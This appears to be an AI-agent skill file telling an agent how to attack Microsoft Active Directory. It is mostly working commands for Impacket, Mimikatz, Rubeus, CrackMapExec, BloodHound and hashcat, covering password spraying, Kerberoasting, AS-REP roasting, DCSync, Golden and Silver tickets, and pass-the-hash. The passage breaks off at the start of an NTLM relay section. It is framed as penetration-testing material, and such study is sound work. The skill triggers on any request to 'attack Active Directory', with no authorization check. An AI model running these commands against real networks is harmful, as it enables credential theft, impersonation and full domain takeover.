---
name: Active Directory Attacks
description: This skill should be used when the user asks to "attack Active Directory", "exploit AD", "Kerberoasting", "DCSync", "pass-the-hash", "BloodHound enumeration", "Golden Ticket", "Silver Ticket", "AS-REP
category: Security & Systems
source: antigravity
tags: [python, ai, llm, workflow, template, document, vulnerability, cro]
url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/active-directory-attacks
---


# Active Directory Attacks

## Purpose

Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.

## Inputs/Prerequisites

- Kali Linux or Windows attack platform
- Domain user credentials (for most attacks)
- Network access to Domain Controller
- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec

## Outputs/Deliverables

- Domain enumeration data
- Extracted credentials and hashes
- Kerberos tickets for impersonation
- Domain Administrator access
- Persistent access mechanisms

---

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack tools |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |

---

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires clock synchronization (±5 minutes):

```bash
# Detect clock skew
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2024 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (from Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Step 3: PowerView Enumeration

```powershell
# Get domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# Enumerate users
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Enumerate groups
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Find local admin access
Find-LocalAdminAccess -Verbose

# User hunting
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## Credential Attacks

### Password Spraying

```bash
# Using kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# Using CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

Extract service account TGS tickets and crack offline:

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication":

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack with hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### DCSync Attack

Extract credentials directly from DC (requires Replicating Directory Changes rights):

```bash
# Impacket
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Kerberos Ticket Attacks

### Pass-the-Ticket (Golden Ticket)

Forge TGT with krbtgt hash for any user:

```powershell
# Get krbtgt hash via DCSync first
# Mimikatz - Create Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### Silver Ticket

Forge TGS for specific service:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

### OverPass-the-Hash

Convert NTLM hash to Kerberos ticket:

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## NTLM Relay Attacks

### Responder + ntlmrelayx

```bash
# Start Responder (disable SMB/H
